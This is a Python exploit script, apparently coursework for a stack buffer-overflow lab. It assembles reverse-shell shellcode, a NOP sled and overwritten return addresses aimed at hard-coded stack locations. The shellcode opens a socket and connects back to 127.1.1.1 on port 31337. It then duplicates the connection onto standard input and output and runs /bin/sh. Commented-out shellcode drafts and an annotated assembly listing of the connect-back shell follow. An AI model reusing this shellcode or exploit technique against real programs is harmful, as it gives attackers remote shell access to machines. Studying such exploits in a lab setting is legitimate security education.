from shellcode import shellcode
from struct import pack

# EBP = 0xbffef238

ret_address = 0xbffef23c  # EBP + 4
buf_address = 0xbffeea28

# 0x08048ef8 <+24>:	lea    -0x810(%ebp),%eax
# so buf_address: EBP - 0x810 = 0xbffeea28

# my_sc_code = '\x31\xc0' + '\xb0\x66' + '\x31\xdb' + '\xb3\x01' + '\x31\xc9' + \
# '\x51' + '\x83\xc1\x01' + '\x51' + '\x83\xc1\x01' + '\x51' +'\x89\xe1' + \
# '\x31\xd2' +'\xcd\x80' + '\x89\xc6'+ \
# '\x31\xc9' + \
# '\x66\x81\xc1\x00\x01' + \
# '\xc1\xe1\x10' + '\x80\xc1\x7f' + \
# '\x51' + '\x66\x68\x7a\x69' + '\x31\xdb' + \
# '\xb3\x02' + '\x66\x53' + '\x89\xe7' + '\x6a\x10' + '\x57' + '\x56' + \
# '\x31\xc0' + '\xb0\x66' + '\x31\xdb' + '\xb3\x03' + '\x89\xe1' + '\xcd\x80' + \
# '\x31\xc0' + '\xb0\x3f' + '\x89\xf3' + '\x31\xc9' + '\xcd\x80' + '\xb0\x3f' + \
# '\x83\xc1\x01' + '\xcd\x80' + '\xb0\x3f' + '\x83\xc1\x01' + '\xcd\x80'
#
# my_sc_code = '\x31\xc0' + '\xb0\x66' + '\x31\xdb' + '\xb3\x01' + '\x31\xc9' + \
# '\x51' + '\x83\xc1\x01' + '\x51' + '\x83\xc1\x01' + '\x51' +'\x89\xe1' + \
# '\x31\xd2' +'\xcd\x80' + '\x89\xc6' + '\x31\xc9' + \
# '\x89\x0d\x80\xff\xff\xfe' + \
# '\xf7\xd1' + \
# '\x51' + '\x66\x68\x7a\x69' + '\x31\xdb' + \
# '\xb3\x02' + '\x66\x53' + '\x89\xe7' + '\x6a\x10' + '\x57' + '\x56' + \
# '\x31\xc0' + '\xb0\x66' + '\x31\xdb' + '\xb3\x03' + '\x89\xe1' + '\xcd\x80' + \
# '\x31\xc0' + '\xb0\x3f' + '\x89\xf3' + '\x31\xc9' + '\xcd\x80' + '\xb0\x3f' + \
# '\x83\xc1\x01' + '\xcd\x80' + '\xb0\x3f' + '\x83\xc1\x01' + '\xcd\x80'

#
# my_sc_code = '\x31\xc0' + '\xb0\x66' + '\x31\xdb' + '\xb3\x01' + '\x31\xc9' + \
# '\x51' + '\x83\xc1\x01' + '\x51' + '\x83\xc1\x01' + '\x51' +'\x89\xe1' + \
# '\x31\xd2' +'\xcd\x80' + '\x89\xc6'+ \
# '\x31\xc9' + \
# '\x66\x81\xc1\x43\x44' + \
# '\xc1\xe1\x10' + \
# '\x66\xb9\x41\x42' + \
# '\x51' + '\x66\x68\x7a\x69' + '\x31\xdb' + \
# '\xb3\x02' + '\x66\x53' + '\x89\xe7' + '\x6a\x10' + '\x57' + '\x56' + \
# '\x31\xc0' + '\xb0\x66' + '\x31\xdb' + '\xb3\x03' + '\x89\xe1' + '\xcd\x80' + \
# '\x31\xc0' + '\xb0\x3f' + '\x89\xf3' + '\x31\xc9' + '\xcd\x80' + '\xb0\x3f' + \
# '\x83\xc1\x01' + '\xcd\x80' + '\xb0\x3f' + '\x83\xc1\x01' + '\xcd\x80'

my_sc_code=("\xba\xf4\xf1\xfe\xbf\x88\x02\x42\x88\x02\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\xb1\x01\x51\xb1\x02\x51\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc2\x31\xc0\x31\xc9\x51\x51\x68\x7f\x01\x01\x01\x66\x68\x7a\x69\xb1\x02\x66\x51\x89\xe7\xb3\x10\x53\x57\x52\x89\xe1\xb3\x03\xb0\x66\xcd\x80\x31\xc9\x39\xc1\x74\x06\x31\xc0\xb0\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\xb1\x02\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80")

print my_sc_code + '\x90'*1907 + pack("<I",buf_address) + pack("<I",ret_address)


#
# print len(shellcode)
# print len(my_sc_code)

# print my_sc_code + shellcode + '\x90'*1933 + pack("<I",buf_address) + pack("<I",ret_address)
# print my_sc_code + shellcode + '\x90'*1912 + pack("<I",buf_address) + pack("<I",ret_address)


## Annotated disassembly:



"""
    xorl    %eax,   %eax
	# fixing null byte on IP
	mov    $0xaaaaaaaa,%edx
	mov    %al,(%edx)
	inc    %edx
	mov    %al,(%edx)

	# call socket() routine
    # init args for socket(int domain, int type, int protocol)
    # domain = 2 (AF_INET) type=1 (SOCK_STREAM), protocol= TCP
    xorl    %ebx,   %ebx
    xorl    %ecx,   %ecx
    pushl   %ecx
    movb    $6,     %cl             # PROTOCOL = TCP
    pushl   %ecx
    movb    $1,     %cl
    pushl   %ecx
    movb    $2,     %cl             # AF_INET = 2
    pushl   %ecx
    movl    %esp,   %ecx
    movb    $1,     %bl             # SYS_SOCKET = 1
    movb    $102,   %al             # call SYS_socketcall
    int     $0x80

    # init for connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
    movl    %eax,   %edx
    xorl    %eax,   %eax
    xorl    %ecx,   %ecx
    pushl   %ecx
    pushl   %ecx

    pushl   $0x44434241  # IP
    # For port
    pushw   $07a69
    movb    $0x02,  %cl
    pushw   %cx
    movl    %esp,   %edi
    movb    $16,    %bl
    pushl   %ebx
    pushl   %edi
    pushl   %edx
    movl    %esp,   %ecx
    movb    $3,     %bl

    movb    $102,   %al
    int     $0x80
    xorl    %ecx,   %ecx
    cmpl    %eax,   %ecx

    je good  # try jump to binding
    # if not connected successfully, try to exit
    xorl    %eax,   %eax
    movb    $1,     %al
    int     $0x80

    # binds socket to IO
    good:

    xorl    %eax,   %eax
    movb    $63,    %al
    movl    %edx,   %ebx
    int     $0x80

    xorl    %eax,   %eax
    movb    $63,    %al
    movl    %edx,   %ebx
    movb    $1,     %cl
    int     $0x80

    xorl    %eax,   %eax
    movb    $63,    %al
    movl    %edx,   %ebx
    movb    $2,     %cl
    int     $0x80

    # run shell
    xorl    %eax,   %eax
    xorl    %edx,   %edx
    pushl   %eax
    pushl   $0x68732f6e

    pushl   $0x69622f2f
    movl    %esp,   %ebx
    pushl   %eax
    pushl   %ebx
    movl    %esp,   %ecx

    movb    $11,    %al
    int     $0x80

    xorl    %eax,   %eax
    movb    $1,     %al
    int     $0x80
"""
